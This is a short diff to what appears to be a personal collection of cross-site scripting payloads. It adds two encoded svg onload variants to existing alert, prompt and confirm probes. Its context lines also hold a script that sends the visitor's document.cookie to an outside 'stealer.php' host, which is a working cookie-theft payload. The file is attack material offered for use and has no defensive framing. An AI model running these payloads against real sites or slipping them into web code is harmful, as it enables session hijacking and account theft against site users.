@@ -10,6 +10,9 @@ abc"><svg+onload=confirm(document.domain)>
 <script>alert("xss bug input search by zhirobyte")</script>
 "><img src=x onerror=prompt(document.cookie)>
 
+<svg onload=prompt%26%230000000040document.domain)>
+<svg onload=prompt%26%23x000000028;document.domain)>
+
 <script type="text/javascript">
 document.location='https://zhirobyte.000webhostapp.com/stealer.php?c='+document.cookie;
 </script>
